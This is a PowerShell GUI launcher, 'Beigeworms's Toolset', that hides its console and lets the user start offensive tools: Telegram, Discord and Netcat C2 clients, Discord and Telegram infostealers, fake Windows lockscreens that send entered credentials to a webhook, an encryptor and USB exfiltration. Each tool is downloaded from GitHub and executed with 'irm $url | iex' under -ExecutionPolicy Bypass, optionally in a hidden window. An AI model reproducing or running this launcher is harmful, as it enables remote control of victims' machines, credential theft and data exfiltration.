Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName Microsoft.VisualBasic
[System.Windows.Forms.Application]::EnableVisualStyles()

if ($hookurl.Length -eq 0){$hookurl = "https://discord.com/api/webhooks/..."} # Change this to open GUI with your details
if ($ghurl.Length -eq 0){$ghurl = "https://pastebin.com/raw/......."} # Change this to open GUI with your details
if ($tg.Length -eq 0){$tg = "Ex4mP137eLeGr4m_4pI-B0t_T0k3N"} # Change this to open GUI with your details
if ($NCurl.Length -eq 0){$NCurl = "192.168.0.1"} # Change this to open GUI with your details

$hidewindow = 1
If ($HideWindow -gt 0){
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

$imageUrl = "https://i.ibb.co/ZGrt8qb/b-min.png"
$client = New-Object System.Net.WebClient
$imageBytes = $client.DownloadData($imageUrl)
$ms = New-Object IO.MemoryStream($imageBytes, 0, $imageBytes.Length)

$items = @(
"Telegram C2 Client"       
"Discord C2 Client"        
"NetCat C2 Client"         
"LAN Toolset"              
"Encryptor"                
"Decryptor"                
"Filetype Finder GUI"      
"Screen Recorder GUI"      
"Network Enumeration GUI"  
"Microphone Muter GUI"     
"Webhook Spammer GUI"      
"Social Search GUI"        
"GDI effects GUI"          
"Telegram Infoscrape"      
"Discord Infoscrape"       
"Netcat Screenshare"       
"Console MC Server Scanner"
"Console Task Manager"     
"Image To Console"         
"Matrix Cascade in console"
"Windows 10 Lockscreen"    
"Windows 11 Lockscreen"    
"Dummy Folder Creator"
"Exfiltrate to USB"
)

$form = New-Object System.Windows.Forms.Form
$form.Text = " | Beigeworms's Toolset |"
$form.Size = New-Object System.Drawing.Size(660,500)
$form.Font = 'Microsoft Sans Serif,10'
$form.BackgroundImage = [System.Drawing.Image]::FromStream($ms, $true)
$form.BackColor = "#242424"

$dropdownHeader = New-Object System.Windows.Forms.Label
$dropdownHeader.Text = "Select Tool Here"
$dropdownHeader.ForeColor = "#bcbcbc"
$dropdownHeader.AutoSize = $true
$dropdownHeader.Width = 25
$dropdownHeader.Height = 10
$dropdownHeader.Location = New-Object System.Drawing.Point(20, 10)
$form.Controls.Add($dropdownHeader)

$dropdown = New-Object System.Windows.Forms.ComboBox
$dropdown.Location = New-Object System.Drawing.Point(20, 30)
$dropdown.Size = New-Object System.Drawing.Size(250, 30)
$dropdown.Items.AddRange($items)
$form.Controls.Add($dropdown)

$WebhookInputHeader = New-Object System.Windows.Forms.Label
$WebhookInputHeader.Text = "Discord Webhook URL"
$WebhookInputHeader.ForeColor = "#bcbcbc"
$WebhookInputHeader.AutoSize = $true
$WebhookInputHeader.Width = 25
$WebhookInputHeader.Height = 10
$WebhookInputHeader.Location = New-Object System.Drawing.Point(20, 60)
$form.Controls.Add($WebhookInputHeader)

$WebhookInput = New-Object System.Windows.Forms.TextBox
$WebhookInput.Text = "$hookurl" # you can set this now for efficiency (optional)
$WebhookInput.Location = New-Object System.Drawing.Point(20, 80)
$WebhookInput.BackColor = "#eeeeee"
$WebhookInput.Width = 600
$WebhookInput.Height = 40
$WebhookInput.Multiline = $false
$form.Controls.Add($WebhookInput)

$TokenInputHeader = New-Object System.Windows.Forms.Label
$TokenInputHeader.Text = "Telegram API Token"
$TokenInputHeader.ForeColor = "#bcbcbc"
$TokenInputHeader.AutoSize = $true
$TokenInputHeader.Width = 25
$TokenInputHeader.Height = 10
$TokenInputHeader.Location = New-Object System.Drawing.Point(20, 110)
$form.Controls.Add($TokenInputHeader)

$TGTokenInput = New-Object System.Windows.Forms.TextBox
$TGTokenInput.Text = "$tg"  # you can set this now for efficiency (optional)
$TGTokenInput.Location = New-Object System.Drawing.Point(20, 130)
$TGTokenInput.BackColor = "#eeeeee"
$TGTokenInput.Width = 600
$TGTokenInput.Height = 40
$TGTokenInput.Multiline = $false
$form.Controls.Add($TGTokenInput)

$PastebinInputHeader = New-Object System.Windows.Forms.Label
$PastebinInputHeader.Text = "RAW Pastebin URL"
$PastebinInputHeader.ForeColor = "#bcbcbc"
$PastebinInputHeader.AutoSize = $true
$PastebinInputHeader.Width = 25
$PastebinInputHeader.Height = 10
$PastebinInputHeader.Location = New-Object System.Drawing.Point(20, 160)
$form.Controls.Add($PastebinInputHeader)

$PastebinInput = New-Object System.Windows.Forms.TextBox
$PastebinInput.Text = "$ghurl" # you can set this now for efficiency (optional)
$PastebinInput.Location = New-Object System.Drawing.Point(20, 180)
$PastebinInput.BackColor = "#eeeeee"
$PastebinInput.Width = 600
$PastebinInput.Height = 40
$PastebinInput.Multiline = $false
$form.Controls.Add($PastebinInput)

$NetcatHeader = New-Object System.Windows.Forms.Label
$NetcatHeader.Text = "Netcat IPv4 Address"
$NetcatHeader.ForeColor = "#bcbcbc"
$NetcatHeader.AutoSize = $true
$NetcatHeader.Width = 25
$NetcatHeader.Height = 10
$NetcatHeader.Location = New-Object System.Drawing.Point(20, 210)
$form.Controls.Add($NetcatHeader)

$netcatInput = New-Object System.Windows.Forms.TextBox
$netcatInput.Text = "$NCurl" # you can set this now for efficiency (optional)
$netcatInput.Location = New-Object System.Drawing.Point(20, 230)
$netcatInput.BackColor = "#eeeeee"
$netcatInput.Width = 600
$netcatInput.Height = 40
$netcatInput.Multiline = $false
$form.Controls.Add($netcatInput)

$startButton = New-Object System.Windows.Forms.Button
$startButton.Location = New-Object System.Drawing.Point(540, 30)
$startButton.Size = New-Object System.Drawing.Size(80, 30)
$startButton.Text = "Start"
$startButton.BackColor = "#fff"
$form.Controls.Add($startButton)

$infoButton = New-Object System.Windows.Forms.Button
$infoButton.Location = New-Object System.Drawing.Point(450, 30)
$infoButton.Size = New-Object System.Drawing.Size(80, 30)
$infoButton.Text = "Info"
$infoButton.BackColor = "#fff"
$form.Controls.Add($infoButton)

$hiddenboxtext = New-Object System.Windows.Forms.Label
$hiddenboxtext.Text = "Hidden Console"
$hiddenboxtext.ForeColor = "#bcbcbc"
$hiddenboxtext.AutoSize = $true
$hiddenboxtext.Width = 25
$hiddenboxtext.Height = 10
$hiddenboxtext.Location = New-Object System.Drawing.Point(340, 38)
$form.Controls.Add($hiddenboxtext)

$hiddenbox = New-Object System.Windows.Forms.CheckBox
$hiddenbox.Location = New-Object System.Drawing.Point(325, 35)
$form.Controls.Add($hiddenbox)

$OutputHeader = New-Object System.Windows.Forms.Label
$OutputHeader.Text = "Output"
$OutputHeader.ForeColor = "#bcbcbc"
$OutputHeader.AutoSize = $true
$OutputHeader.Width = 25
$OutputHeader.Height = 10
$OutputHeader.Location = New-Object System.Drawing.Point(20, 260)
$form.Controls.Add($OutputHeader)

$OutputBox = New-Object System.Windows.Forms.TextBox 
$OutputBox.Multiline = $True;
$OutputBox.Location = New-Object System.Drawing.Point(20, 280) 
$OutputBox.Width = 600
$OutputBox.Height = 150
$OutputBox.Scrollbars = "Vertical" 
$form.Controls.Add($OutputBox)

Function Add-OutputBoxLine{
    Param ($outfeed) 
    $OutputBox.AppendText("`r`n$outfeed")
    $OutputBox.Refresh()
    $OutputBox.ScrollToCaret()
}

$startButton.Add_Click({
    $selectedItem = $dropdown.SelectedItem
    if($selectedItem.length -eq 0 ){Add-OutputBoxLine -Outfeed "Nothing Selected! Please choose a tool from the dropdown menu.";return}
    Add-OutputBoxLine -Outfeed "$selectedItem Selected"
    $BaseURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master"
    $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
    $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Terminal.ps1"
    $hookurl = $WebhookInput.Text
    $ghurl = $PastebinInput.Text
    $tg = $TGTokenInput.Text
    $NCurl = $netcatInput.Text

    switch ($selectedItem) {
        "Telegram C2 Client"       {$url = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"}
        "Discord C2 Client"        {$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
        "NetCat C2 Client"         {$url = "$BaseURL/NC-Func.ps1"}
        "LAN Toolset"              {$url = "https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1"}
        "Encryptor"                {$url = "$PoshcryptURL/Encryption/Encryptor.ps1"}
        "Decryptor"                {$url = "$PoshcryptURL/Decryption/Decryptor-GUI.ps1"}
        "Filetype Finder GUI"      {$url = "$BaseURL/Search-Folders-For-Filetypes-GUI.ps1"}
        "Screen Recorder GUI"      {$url = "$BaseURL/Record-Screen-GUI.ps1"}
        "Network Enumeration GUI"  {$url = "$BaseURL/Network-Enumeration-GUI.ps1"} 
        "Microphone Muter GUI"     {$url = "$BaseURL/Mute-Microphone-GUI.ps1"}
        "Webhook Spammer GUI"      {$url = "$BaseURL/Discord-Webhook-Spammer-GUI.ps1"}
        "Social Search GUI"        {$url = "$BaseURL/Social-Search-GUI.ps1"}
        "GDI effects GUI"          {$url = "$BaseURL/Desktop-GDI-Efects-GUI.ps1"}
        "Telegram Infoscrape"      {$url = "$BaseURL/Telegram-InfoStealer.ps1"}
        "Discord Infoscrape"       {$url = "$BaseURL/Discord-Infostealer.ps1"}
        "Netcat Screenshare"       {$url = "$BaseURL/Desktop-Screenshare-over-Netcat.ps1"}
        "Console MC Server Scanner"{$url = "$BaseURL/Minecraft-Server-Scanner-and-Server-Info.ps1"}
        "Console Task Manager"     {$url = "$BaseURL/Console-Task-Manager.ps1"}
        "Image To Console"         {$url = "$BaseURL/Image-to-Console.ps1"}
        "Matrix Cascade in console"{$url = "$BaseURL/Matrix-Cascade-in-Powershell.ps1"}
        "Windows 10 Lockscreen"    {$url = "$BaseURL/Fake-Windows-10-Lockscreen-to-Webhook.ps1"}
        "Windows 11 Lockscreen"    {$url = "$BaseURL/Fake-Windows-11-Lockscreen-to-Webhook.ps1"}
        "Dummy Folder Creator"     {$url = "$BaseURL/Dummy-Folder-Creator.ps1"}
        "Exfiltrate to USB"{$url = "$BaseURL/ExfiltrateToUSB.ps1"}
    }
    Add-OutputBoxLine -Outfeed "$selectedItem URL : $url"
    if(($hiddenbox.Checked) -and ($selectedItem -notlike "*Console*") -and ($selectedItem -notlike "*LAN*")){
        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
        Add-OutputBoxLine -Outfeed "Started $selectedItem With Console Hidden"
    }
    else{
        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$stage = `'y`' ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
        Add-OutputBoxLine -Outfeed "Started $selectedItem With Console Visible"
    }
})

$infoButton.Add_Click({
    $OutputBox.Clear()
    $selectedItem = $dropdown.SelectedItem
    if($selectedItem.length -eq 0 ){Add-OutputBoxLine -Outfeed "Nothing Selected! Please choose a tool from the dropdown menu.";return}
    Add-OutputBoxLine -Outfeed "$selectedItem Information/Help"
    Add-OutputBoxLine -Outfeed "=================================================================================="
    $BaseURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master"
    $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"

    switch ($selectedItem) {
        "Telegram C2 Client"       {$url = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"}
        "Discord C2 Client"        {$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
        "NetCat C2 Client"         {$url = "$BaseURL/NC-Func.ps1"}
        "LAN Toolset"              {$url = "https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1"}
        "Encryptor"                {$url = "$PoshcryptURL/Encryption/Encryptor.ps1"}
        "Decryptor"                {$url = "$PoshcryptURL/Decryption/Decryptor-GUI.ps1"}
        "Filetype Finder GUI"      {$url = "$BaseURL/Search-Folders-For-Filetypes-GUI.ps1"}
        "Screen Recorder GUI"      {$url = "$BaseURL/Record-Screen-GUI.ps1"}
        "Network Enumeration GUI"  {$url = "$BaseURL/Network-Enumeration-GUI.ps1"} 
        "Microphone Muter GUI"     {$url = "$BaseURL/Mute-Microphone-GUI.ps1"}
        "Webhook Spammer GUI"      {$url = "$BaseURL/Discord-Webhook-Spammer-GUI.ps1"}
        "Social Search GUI"        {$url = "$BaseURL/Social-Search-GUI.ps1"}
        "GDI effects GUI"          {$url = "$BaseURL/Desktop-GDI-Efects-GUI.ps1"}
        "Telegram Infoscrape"      {$url = "$BaseURL/Telegram-InfoStealer.ps1"}
        "Discord Infoscrape"       {$url = "$BaseURL/Discord-Infostealer.ps1"}
        "Netcat Screenshare"       {$url = "$BaseURL/Desktop-Screenshare-over-Netcat.ps1"}
        "Console MC Server Scanner"{$url = "$BaseURL/Minecraft-Server-Scanner-and-Server-Info.ps1"}
        "Console Task Manager"     {$url = "$BaseURL/Console-Task-Manager.ps1"}
        "Image To Console"         {$url = "$BaseURL/Image-to-Console.ps1"}
        "Matrix Cascade in console"{$url = "$BaseURL/Matrix-Cascade-in-Powershell.ps1"}
        "Windows 10 Lockscreen"    {$url = "$BaseURL/Fake-Windows-10-Lockscreen-to-Webhook.ps1"}
        "Windows 11 Lockscreen"    {$url = "$BaseURL/Fake-Windows-11-Lockscreen-to-Webhook.ps1"}
        "Dummy Folder Creator"     {$url = "$BaseURL/Dummy-Folder-Creator.ps1"}
        "Exfiltrate to USB"{$url = "$BaseURL/ExfiltrateToUSB.ps1"}
    }
    $fileContent = Invoke-RestMethod -Uri $Url
    $pattern = '(?s)<#(.*?)#>'
    $matches = [regex]::Matches($fileContent, $pattern)
    foreach ($match in $matches) {
        $textInsideHashTags = $match.Groups[1].Value
        Add-OutputBoxLine -Outfeed $textInsideHashTags
    }
    Add-OutputBoxLine -Outfeed "=================================================================================="
    Add-OutputBoxLine -Outfeed "$selectedItem URL : $url"
})
[Windows.Forms.Application]::Run($form)

